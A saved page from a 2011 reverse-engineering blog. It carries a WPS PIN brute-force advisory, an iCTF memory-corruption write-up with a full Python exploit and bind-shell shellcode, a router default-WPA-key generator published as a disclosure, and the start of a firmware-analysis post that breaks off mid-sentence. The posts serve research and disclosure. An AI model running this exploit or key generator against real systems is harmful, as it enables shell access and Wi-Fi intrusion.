<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--[if IE 7]>
<html id="ie7" xmlns="http://www.w3.org/1999/xhtml" lang="en">
<![endif]-->
<!--[if (gt IE 7) | (!IE)]><!-->
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<!--<![endif]-->

<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>.braindump - RE and stuff</title>

	<style type="text/css" media="screen">
		@import url( https://s0.wp.com/wp-content/themes/pub/rubric/style.css );
	</style>

	<link rel="pingback" href="https://sviehb.wordpress.com/xmlrpc.php" />
	<link rel='dns-prefetch' href='//s2.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//s1.wp.com' />
<link rel='dns-prefetch' href='//s.pubmine.com' />
<link rel='dns-prefetch' href='//x.bidswitch.net' />
<link rel='dns-prefetch' href='//static.criteo.net' />
<link rel='dns-prefetch' href='//ib.adnxs.com' />
<link rel='dns-prefetch' href='//aax.amazon-adsystem.com' />
<link rel='dns-prefetch' href='//bidder.criteo.com' />
<link rel='dns-prefetch' href='//cas.criteo.com' />
<link rel='dns-prefetch' href='//gum.criteo.com' />
<link rel='dns-prefetch' href='//ads.pubmatic.com' />
<link rel='dns-prefetch' href='//gads.pubmatic.com' />
<link rel='dns-prefetch' href='//tpc.googlesyndication.com' />
<link rel='dns-prefetch' href='//ad.doubleclick.net' />
<link rel='dns-prefetch' href='//googleads.g.doubleclick.net' />
<link rel='dns-prefetch' href='//www.googletagservices.com' />
<link rel='dns-prefetch' href='//cdn.switchadhub.com' />
<link rel='dns-prefetch' href='//delivery.g.switchadhub.com' />
<link rel='dns-prefetch' href='//delivery.swid.switchadhub.com' />
<link rel="alternate" type="application/rss+xml" title=".braindump - RE and stuff &raquo; Feed" href="https://sviehb.wordpress.com/feed/" />
<link rel="alternate" type="application/rss+xml" title=".braindump - RE and stuff &raquo; Comments Feed" href="https://sviehb.wordpress.com/comments/feed/" />
	<script type="text/javascript">
		/* <![CDATA[ */
		function addLoadEvent(func) {
			var oldonload = window.onload;
			if (typeof window.onload != 'function') {
				window.onload = func;
			} else {
				window.onload = function () {
					oldonload();
					func();
				}
			}
		}
		/* ]]> */
	</script>
			<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s0.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1505864856h&ver=4.8.2"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,56826,8203,55356,56819),0,0),c=j.toDataURL(),b!==c&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55358,56794,8205,9794,65039),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55358,56794,8203,9794,65039),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='all-css-0-1' href='https://s1.wp.com/_static/??-eJx9kdFuwyAMRX9oHspWddvDtG8xxCNucYyAKNvflzSLsq4TL+heuMcGY+YITsdCYzEyQQyT5zGbOToVyMKBvv+4R5fzg/kfC3ymbE5UIrozXN1d3Ab1ex9NPfbZ+KAWQ6u000R1XyKWJSHUM1IgqbEWNnPvqVQ8bxoKfTURicet0SKH+pTmo9fpWBsT5Qx1FZ4EylDv1uZ+rpbVMQbgGrk1K8xm1LIebqJV1ZNCUIeFdbwx8BmQUwtNtPxNlf46rt22IHRLcYtpV3fxdRZmOPz65w957w5vL0+vXffcnS58NvL2' type='text/css' media='all' />
<script type='text/javascript' src='https://s1.wp.com/_static/??-eJyFztEKwjAMBdAfsquTiXsRv6XWOFKXtDbphn69HeiDMBQCgdzDJXZOBtmP5QJiQ517gfx4rybIxv4ChnDITqEh5A/2kRVYF0vxjCOYIpDdUG+16BpXXIqiBCIVraTfLyFPCPNfFkCT8zeTQfC5tJ7o2Hb9Yde3+24bXjRNW9I='></script>
<link rel='stylesheet' id='all-css-0-2' href='https://s1.wp.com/wp-content/mu-plugins/highlander-comments/style.css?m=1377793621h' type='text/css' media='all' />
<!--[if lt IE 8]>
<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s1.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' type='text/css' media='all' />
<![endif]-->
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://sviehb.wordpress.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://s1.wp.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress.com" />
<link rel='shortlink' href='http://wp.me/1OLiN' />

<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="website" />
<meta property="og:title" content=".braindump - RE and stuff" />
<meta property="og:url" content="https://sviehb.wordpress.com/" />
<meta property="og:site_name" content=".braindump - RE and stuff" />
<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:site" content="@wordpressdotcom" />
<meta property="fb:app_id" content="249643311490" />
<link rel="shortcut icon" type="image/x-icon" href="https://s2.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48" />
<link rel="icon" type="image/x-icon" href="https://s2.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48" />
<link rel="apple-touch-icon-precomposed" href="https://s0.wp.com/i/webclip.png" />
<link rel='openid.server' href='https://sviehb.wordpress.com/?openidserver=1' />
<link rel='openid.delegate' href='https://sviehb.wordpress.com/' />
<link rel="search" type="application/opensearchdescription+xml" href="https://sviehb.wordpress.com/osd.xml" title=".braindump - RE and stuff" />
<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com" />
		<style id="wpcom-hotfix-masterbar-style">
			@media screen and (min-width: 783px) {
				#wpadminbar .quicklinks li#wp-admin-bar-my-account.with-avatar > a img {
					margin-top: 5px;
				}
			}
		</style>
		<meta name="application-name" content=".braindump - RE and stuff" /><meta name="msapplication-window" content="width=device-width;height=device-height" /><meta name="msapplication-task" content="name=Subscribe;action-uri=https://sviehb.wordpress.com/feed/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=Sign up for a free blog;action-uri=http://wordpress.com/signup/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=WordPress.com Support;action-uri=http://support.wordpress.com/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=WordPress.com Forums;action-uri=http://forums.wordpress.com/;icon-uri=https://s2.wp.com/i/favicon.ico" /><meta name="title" content=".braindump - RE and stuff on WordPress.com" />
<style type="text/css">
#header{
	background: url(https://sviehb.files.wordpress.com/2011/12/page12.png) no-repeat top right;
}
#header a {
	color:#B54141;
}
</style>
		<script type="text/javascript">
		var __ATA_PP = { pt: 0, ht: 0, tn: 'rubric', amp: false };
		</script>
		<script type="text/javascript" src="//s.pubmine.com/head.js"></script>
		<script type="text/javascript" src="https://static.criteo.net/js/ld/publishertag.js"></script><style type="text/css" id="syntaxhighlighteranchor"></style>
<script type="text/javascript">
	window.google_analytics_uacct = "UA-52447-2";
</script>

<script type="text/javascript">
	var _gaq = _gaq || [];
	_gaq.push(['_setAccount', 'UA-52447-2']);
	_gaq.push(['_setDomainName', 'wordpress.com']);
	_gaq.push(['_initData']);
	_gaq.push(['_trackPageview']);

	(function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
	})();
</script>
</head>

<body class="home blog mp6 customizer-styles-applied highlander-enabled highlander-light">
<div id="rap">
<h1 id="header"><a href="https://sviehb.wordpress.com/">.braindump &#8211; RE and stuff</a></h1>

<div id="content">
<!-- end header -->


<h2>December 27, 2011</h2>
<div class="post-225 post type-post status-publish format-standard hentry category-advisories" id="post-225">
	 <h3 class="storytitle">
			<a href="https://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/" rel="bookmark">Wi-Fi Protected Setup PIN brute force&nbsp;vulnerability</a>
		 </h3>
	<div class="meta">Filed under:  <a href="https://sviehb.wordpress.com/category/advisories/" rel="category tag">advisories</a> &#8212; Stefan @ 3:00 am <br /></div>

	<div class="storycontent">
		<p>A few weeks ago I decided to take a look at the <a href="http://www.wi-fi.org/wifi-protected-setup/" target="_blank">Wi-Fi Protected Setup</a> (WPS) technology. I noticed a few really bad design decisions which enable an efficient brute force attack, thus effectively breaking the security of pretty much all WPS-enabled Wi-Fi routers. As all of the more recent router models come with WPS enabled by default, this affects millions of devices worldwide.</p>
<p>I reported this vulnerability to <a href="http://www.cert.org/" target="_blank">CERT/CC</a> and provided them with a list of (confirmed) affected vendors. CERT/CC has assigned <a href="http://www.kb.cert.org/vuls/id/723755" target="_blank">VU#723755</a> to this issue.<br />
To my knowledge <strong>none</strong> of the vendors have reacted and released firmware with mitigations in place.</p>
<p>Detailed information about this vulnerability can be found in this paper: <strong><a href="https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf">Brute forcing Wi-Fi Protected Setup</a></strong> &#8211; Please keep in mind that the devices mentioned there are just a tiny subset of the affected devices.</p>
<p>I would like to thank the guys at CERT for coordinating this vulnerability.</p>
<p><strong>Update (12/29/2011 &#8211; 20:15 CET)</strong><br />
As you probably already know, this vulnerability was <strong>independently</strong> discovered by Craig Heffner (<a title="/dev/ttyS0" href="http://www.devttys0.com/" rel="home" target="_blank">/dev/ttyS0</a>, <a href="http://www.tacnetsol.com/" target="_blank">Tactical Network Solutions</a>) as well &#8211; I was just the one who reported the vulnerability and released information about it first. Craig and his team have now released their tool &#8220;Reaver&#8221; over at <a href="http://code.google.com/p/reaver-wps/" target="_blank">Google Code</a>.</p>
<p>My PoC Brute Force Tool can be found <a href="http://dl.dropbox.com/u/22108808/wpscrack.zip" target="_blank">here</a>. It&#8217;s a bit faster than Reaver, but will not work with all Wi-Fi adapters.<strong></strong></p>
<p><strong>Update (12/31/2011 &#8211; 14:25 CET)</strong><br />
<div class="embed-vimeo" style="text-align: center;"><iframe src="https://player.vimeo.com/video/34402962" width="0" height="0" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div></p>
<p><strong>Update (04/01/2012 – 17:45 CET)<br />
</strong>Tactical Network Solutions has decided to release the code for the commercial version of <a href="http://code.google.com/p/reaver-wps/" target="_blank">Reaver</a>. You might want to check it out.<strong><br />
</strong></p>
			<style type="text/css">
			div.wpmrec2x{max-width:610px;}
			div.wpmrec2x div.u > div{float:left;margin-right:10px;}
			div.wpmrec2x div.u > div:nth-child(3n){margin-right:0px;}
			</style>		<div class="wpcnt">
			<div class="wpa wpmrec wpmrec2x">
				<span class="wpa-about">Advertisements</span>
				<div class="u">
										<script type='text/javascript' id="s26942">
						(function(g,$){if("undefined"!=typeof g.__ATA){
							g.__ATA.initAd({collapseEmpty:'after', sectionId:26942, width:300, height:250});
							if($("#s26942").closest("div.wpcnt").outerWidth() > 305 ) {
								g.__ATA.initAd({collapseEmpty:'after', sectionId:114160, width:300, height:250});
							}
						}})(window,jQuery);
					</script>
				</div>
						<div id="crt-1044356007" style="width:300px;height:250px;"></div>
		<script type="text/javascript">
		var o = document.getElementById('crt-1044356007');
		if ("undefined"!=typeof Criteo) {
			var p = o.parentNode;
			p.style.setProperty('display', 'inline-block', 'important');
			o.style.setProperty('display', 'block', 'important');
			Criteo.DisplayAcceptableAdIfAdblocked({zoneid:388248,containerid:"crt-1044356007",collapseContainerIfNotAdblocked:true,"callifnotadblocked": function () {var o = document.getElementById('crt-1044356007'); o.style.setProperty('display','none','important');o.style.setProperty('visbility','hidden','important'); } });
		} else {
			o.style.setProperty('display', 'none', 'important');
			o.style.setProperty('visibility', 'hidden', 'important');
		}
		</script>		<div id="crt-764222351" style="width:300px;height:250px;"></div>
		<script type="text/javascript">
		var o = document.getElementById('crt-764222351');
		if ("undefined"!=typeof Criteo) {
			var p = o.parentNode;
			p.style.setProperty('display', 'inline-block', 'important');
			o.style.setProperty('display', 'block', 'important');
			Criteo.DisplayAcceptableAdIfAdblocked({zoneid:837497,containerid:"crt-764222351",collapseContainerIfNotAdblocked:true,"callifnotadblocked": function () {var o = document.getElementById('crt-764222351'); o.style.setProperty('display','none','important');o.style.setProperty('visbility','hidden','important'); } });
		} else {
			o.style.setProperty('display', 'none', 'important');
			o.style.setProperty('visibility', 'hidden', 'important');
		}
		</script>
			</div>
		</div>	</div>

	<div class="feedback">
                        <a href="https://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/#comments">Comments (316)</a>	</div>

</div>



<h2>December 8, 2011</h2>
<div class="post-180 post type-post status-publish format-standard hentry category-re" id="post-180">
	 <h3 class="storytitle">
			<a href="https://sviehb.wordpress.com/2011/12/08/ucsb-ictf-smsgw-memory-corruption-exploit/" rel="bookmark">UCSB iCTF smsgw Memory Corruption&nbsp;Exploit</a>
		 </h3>
	<div class="meta">Filed under:  <a href="https://sviehb.wordpress.com/category/re/" rel="category tag">RE</a> &#8212; Stefan @ 4:35 pm <br /></div>

	<div class="storycontent">
		<p>I had a great time at <a href="http://ictf.cs.ucsb.edu/" target="_blank">UCSB iCTF</a> 2011 last weekend. Unfortunately, I did not have a chance to look at the (<a href="http://dl.dropbox.com/u/22108808/smsgw">binary-only</a>) service smsgw, so I did just that today.</p>
<p>A writeup for smsgw&#8217;s sister process mailgw is <a href="http://antoxar.blogspot.com/2011/12/write-up-mailgw-ictf2011.html" target="_blank">already available</a>.<br />
Other than in mailgw, no user controlled code (shellcode) is directly called in this service. However, arbitrary data can be written to arbitrary memory locations.</p>
<p>From manage_tcp_client():</p>
<pre class="brush: cpp; title: ; notranslate" title="">
device_data = &amp;msg_info_ptr[4 * number_devices];
for ( i = 0; (signed int)i &lt; (signed int)number_devices; ++i )
{
  current_device = &amp;msg_info_ptr[4 * i];
  device_offset = read_int((uint32_t **)&amp;current_device);
  ...
  *(_DWORD *)&amp;device_data[device_offset] = *(_DWORD *)&amp;msg_info[65536];// interesting!
  current_device = &amp;device_data[device_offset + 4];
  current_device_name = read_string((const void **)&amp;current_device);
  ...
</pre>
<p>Both device_offset and msg_info[] is user input.</p>
<p>But how can we gain control of EIP?<br />
The answer can be found in main():</p>
<pre class="brush: cpp; title: ; notranslate" title="">
mprotect((void *)(-pagesize &amp; (unsigned int)msg_info),
         (-pagesize &amp; (unsigned int)&amp;msg_info[pagesize + 65543]) - (-pagesize &amp; (unsigned int)msg_info),
         7)
</pre>
<p>This code makes at least two pages RWX (assuming pagesize==0x1000).<br />
Let&#8217;s see which memory areas are affected:</p>
<pre class="brush: plain; title: ; notranslate" title="">
0804c000-0804d000 rwxp 00003000 08:01 1081943    /tmp/smsgw
0804d000-0805d000 rwxp 00000000 00:00 0

[23] .got.plt          PROGBITS        0804bff4 002ff4 0000bc 04  WA  0   0  4
[24] .data             PROGBITS        0804c0b0 0030b0 000008 00  WA  0   0  4
[25] .bss              NOBITS          0804c0c0 0030b8 010048 00  WA  0   0 32
</pre>
<p>My solution is to overwrite one pointer in .got.plt to make it point to my shellcode.<br />
After corrupting memory, read_string will be called, which in turn calls ntohl. So this is the function pointer we want to corrupt.</p>
<pre class="brush: plain; title: ; notranslate" title="">
.got.plt:0804C034 E4 C1 05 08             off_804C034     dd offset ntohl         ; DATA XREF: _ntohlr
</pre>
<p>This is the whole exploit (with some random padding) 🙂</p>
<pre class="brush: python; title: ; notranslate" title="">
import socket
import struct
import random

HOST, PORT = &quot;192.168.78.129&quot;, 1991

def send(msg):
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
sock.send(msg)
sock.close()

def rand(count):
return ''.join(chr(random.randint(0,255)) for _ in range(count))

def main():
ntohl_ptr = 0x0804C034
msg_info_addr = 0x0804C100
msg_info_len = 65544

'''
linux x86 shellcode by eSDee of Netric (www.netric.org)
200 byte - forking portbind shellcode - port=0xb0ef(45295)
http://shell-storm.org/shellcode/files/shellcode-553.php
'''
shell = &quot;\x31\xc0\x31\xdb\x31\xc9\x51\xb1&quot;
shell += &quot;\x06\x51\xb1\x01\x51\xb1\x02\x51&quot;
shell += &quot;\x89\xe1\xb3\x01\xb0\x66\xcd\x80&quot;
shell += &quot;\x89\xc1\x31\xc0\x31\xdb\x50\x50&quot;
shell += &quot;\x50\x66\x68\xb0\xef\xb3\x02\x66&quot;
shell += &quot;\x53\x89\xe2\xb3\x10\x53\xb3\x02&quot;
shell += &quot;\x52\x51\x89\xca\x89\xe1\xb0\x66&quot;
shell += &quot;\xcd\x80\x31\xdb\x39\xc3\x74\x05&quot;
shell += &quot;\x31\xc0\x40\xcd\x80\x31\xc0\x50&quot;
shell += &quot;\x52\x89\xe1\xb3\x04\xb0\x66\xcd&quot;
shell += &quot;\x80\x89\xd7\x31\xc0\x31\xdb\x31&quot;
shell += &quot;\xc9\xb3\x11\xb1\x01\xb0\x30\xcd&quot;
shell += &quot;\x80\x31\xc0\x31\xdb\x50\x50\x57&quot;
shell += &quot;\x89\xe1\xb3\x05\xb0\x66\xcd\x80&quot;
shell += &quot;\x89\xc6\x31\xc0\x31\xdb\xb0\x02&quot;
shell += &quot;\xcd\x80\x39\xc3\x75\x40\x31\xc0&quot;
shell += &quot;\x89\xfb\xb0\x06\xcd\x80\x31\xc0&quot;
shell += &quot;\x31\xc9\x89\xf3\xb0\x3f\xcd\x80&quot;
shell += &quot;\x31\xc0\x41\xb0\x3f\xcd\x80\x31&quot;
shell += &quot;\xc0\x41\xb0\x3f\xcd\x80\x31\xc0&quot;
shell += &quot;\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;
shell += &quot;\x62\x69\x6e\x89\xe3\x8b\x54\x24&quot;
shell += &quot;\x08\x50\x53\x89\xe1\xb0\x0b\xcd&quot;
shell += &quot;\x80\x31\xc0\x40\xcd\x80\x31\xc0&quot;
shell += &quot;\x89\xf3\xb0\x06\xcd\x80\xeb\x99&quot;

msg = '\x00\x00\x00\x13'
msg += '\x32\x30\x31\x31\x2d\x31\x32\x2d'
msg += '\x30\x32\x20\x31\x34\x3a\x31\x31'
msg += '\x3a\x35\x31\x00\x00\x00\x06\x61'
msg += '\x62\x64\x78\x35\x68\x00\x00\x00'
msg += '\x27\x66\x6c\x67\x30\x31\x37\x32'
msg += '\x30\x30\x65\x62\x64\x30\x65\x65'
msg += '\x32\x63\x39\x30\x32\x31\x39\x66'
msg += '\x61\x63\x62\x65\x32\x32\x61\x62'
msg += '\x65\x65\x36\x64\x62\x36\x35\x63'
msg += '\x00\x00\x00\x40\x74\x61\x6b\x64'
msg += '\x61\x38\x62\x63\x76\x6e\x6f\x75'
msg += '\x71\x6c\x32\x72\x72\x61\x67\x77'
msg += '\x38\x37\x68\x70\x67\x67\x66\x7a'
msg += '\x69\x72\x34\x6b\x64\x66\x6e\x73'
msg += '\x38\x71\x70\x78\x65\x6b\x74\x36'
msg += '\x66\x30\x63\x61\x69\x38\x69\x75'
msg += '\x31\x77\x62\x39\x74\x77\x32\x33'
msg += '\x79\x76\x66\x73'
msg += '\x00\x00\x00\x01' # number of devices

msg += struct.pack('!i', ntohl_ptr - (msg_info_addr + len(msg) + 4)) # .got.plt:0804C034 off_804C034 dd offset ntohl
msg += rand(random.randint(0,500))
shell_offset = len(msg)
msg += shell
msg += rand(msg_info_len - len(msg) - (msg_info_len - 65536))
msg += struct.pack('I', msg_info_addr + shell_offset)  # *(_DWORD *)&amp;msg_info[65536]
msg += rand(msg_info_len - len(msg))

msg_size = struct.pack('!I', msg_info_len)

print 'sending message to %s, len = %i ' % (HOST,len(msg))
send(msg_size + msg)

if __name__ == &quot;__main__&quot;:
main()
</pre>
	</div>

	<div class="feedback">
                        <a href="https://sviehb.wordpress.com/2011/12/08/ucsb-ictf-smsgw-memory-corruption-exploit/#comments">Comments (8)</a>	</div>

</div>



<h2>December 4, 2011</h2>
<div class="post-163 post type-post status-publish format-standard hentry category-advisories category-re" id="post-163">
	 <h3 class="storytitle">
			<a href="https://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/" rel="bookmark">A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm&nbsp;Weakness</a>
		 </h3>
	<div class="meta">Filed under:  <a href="https://sviehb.wordpress.com/category/advisories/" rel="category tag">advisories</a>,<a href="https://sviehb.wordpress.com/category/re/" rel="category tag">RE</a> &#8212; Stefan @ 8:05 pm <br /></div>

	<div class="storycontent">
		<pre class="brush: python; title: ; notranslate" title="">
'''
title:          A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness
product names:  PRG EAV4202N, PRGAV4202N, PRG 4202 N, P.RG AV4202N
device class:   802.11n DSL broadband gateway
vulnerable:     S/N PI101120401*
not vulnerable: S/N PI105220402* (?)
impact:         critical

product notes:
This device is manufactured by ADB Broadband (formerly Pirelli Broadband) and is rebranded for
A1 (formerly Telekom Austria). A Wi-Fi AP is enabled by default and can be accessed with the
default WPA-key printed on the back of the device.

vulnerability description:
The algorithm for the default WPA-key is entirely based on the internal MAC address (rg_mac).
rg_mac can either be derived from BSSID and SSID (if not changed) or BSSID alone.

timeline:
2010-11-20 working exploit
2010-12-04 informed Telekom Austria
2010-12-06 TA requests exploit code
2010-12-07 PoC sent
2010-12-09 TA starts analysis with ADB Broadband
2010-12-17 analysis finished
2010-12-20 vulnerability confirmed, will be fixed in next hardware(!) revision
...
2011-03-10 TA discloses vulnerability to press
2011-03-10 TA confirms that they will not inform affected customers directly
2011-12-04 grace period over

references:
http://broadband.adbglobal.com/medias/images/products/prg_av4202n/data_sheet_p_rg_av4202n.pdf
http://futurezone.at/produkte/2165-massives-sicherheitsproblem-bei-telekom-modems.php
http://help.orf.at/stories/1678161/
'''

import sys, re, hashlib

def gen_key(mac):
    seed = ('\x54\x45\x4F\x74\x65\x6C\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x94\x3F\xDC\xE8')
    lookup = '0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz'

    h = hashlib.sha256()
    h.update(seed)
    h.update(mac)
    digest = bytearray(h.digest())
    return ''.join([lookup[x % len(lookup)] for x in digest[0:13]])

def main():
    print '*********************************************************************'
    print ' A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness'
    print '                 Stefan Viehboeck &lt;@sviehb&gt; 11.2010'
    print '*********************************************************************'

    if len(sys.argv) != 2:
        sys.exit('usage: pirelli_wpa.py [RG_MAC] or [BSSID]\n eg. pirelli_wpa.py 38229D112233\n')

    mac_str = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
    if len(mac_str) != 12:
        sys.exit('check MAC format!\n')

    mac = bytearray.fromhex(mac_str)
    print 'based on rg_mac:\nSSID: PBS-%02X%02X%02X' % (mac[3], mac[4], mac[5])
    print 'WPA key: %s\n' % (gen_key(mac))

    mac[5] -= 5
    print 'based on BSSID:\nSSID: PBS-%02X%02X%02X' % (mac[3], mac[4], mac[5])
    print 'WPA key: %s\n' % (gen_key(mac))

if __name__ == &quot;__main__&quot;:
    main()
</pre>
	</div>

	<div class="feedback">
                        <a href="https://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/#comments">Comments (8)</a>	</div>

</div>



<h2>September 9, 2011</h2>
<div class="post-49 post type-post status-publish format-standard hentry category-uncategorized tag-arcadyan-2 tag-arcor tag-ida tag-re-2" id="post-49">
	 <h3 class="storytitle">
			<a href="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/" rel="bookmark">Reverse engineering an obfuscated firmware image E02 &#8211;&nbsp;analysis</a>
		 </h3>
	<div class="meta">Filed under:  <a href="https://sviehb.wordpress.com/category/uncategorized/" rel="category tag">Uncategorized</a> &#8212; Stefan @ 1:15 pm <br />Tags: <a href="https://sviehb.wordpress.com/tag/arcadyan-2/" rel="tag">arcadyan</a>, <a href="https://sviehb.wordpress.com/tag/arcor/" rel="tag">arcor</a>, <a href="https://sviehb.wordpress.com/tag/ida/" rel="tag">ida</a>, <a href="https://sviehb.wordpress.com/tag/re-2/" rel="tag">re</a><br /></div>

	<div class="storycontent">
		<p>This part is again specific to firmware for the EasyBox 803 (and similar models by Arcadyan), but the techniques presented can easily applied to other firmware, even on different architectures.</p>
<p>Now that we&#8217;ve got a file with the actual instructions we need to load it into IDA. As the file (unlike a ELF/PE binary) does not come with all the information we need to properly load it into IDA, we have to gather some information manually.</p>
<p>The first challenge is to find the load address. This is the memory location where the binary would be located at, if it would actually be running on the device.</p>
<p><img data-attachment-id="35" data-permalink="https://sviehb.wordpress.com/2011/09/06/reverse-engineering-an-obfuscated-firmware-image-e01-unpacking/call_to_unzipfw/" data-orig-file="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181" data-orig-size="782,181" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="call_to_unzipfw" data-image-description="" data-medium-file="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181?w=300" data-large-file="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181?w=782" class="alignnone size-full wp-image-35" title="call_to_unzipfw" src="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=782&#038;h=181" alt="" width="782" height="181" srcset="https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png 782w, https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=150&amp;h=35 150w, https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=300&amp;h=69 300w, https://sviehb.files.wordpress.com/2011/09/call_to_unzipfw.png?w=768&amp;h=178 768w" sizes="(max-width: 782px) 100vw, 782px" /></p>
<p>I&#8217;ve reverse engineered the bootloader so I have already this information. (see <strong>unpack_loc</strong> or the second argument for <strong>printf</strong>)<br />
Note: even if you have the bootloader you will have to find the bootloader&#8217;s load address -&gt; chicken|egg. (btw: load address for the bootloader is <code>0x83000000</code>, at file offset <code>0x1000</code>!)</p>
<p>You can also find the address with trial and error, which basically works as follows:</p>
<ul>
<li>disassemble manually or with IDAPython magic</li>
<li>look at <strong>operands</strong> of <strong>li</strong> (load immediate), <strong>la</strong> (load address) and <strong>lui</strong> (load upper immediate) instructions</li>
<li>reload binary or relocate segment according to your observations</li>
<li>your are done if you have xrefs right at the beginning of strings 🙂 (apparently parts of this process can be automatized: <a href="http://blog.hsorbo.no/2010/02/reverse-engineering-airport-express_26.html" target="_blank">Reverse engineering the Airport Express Part 3</a>)</li>
</ul>
<p>In this case there is another option:<br />
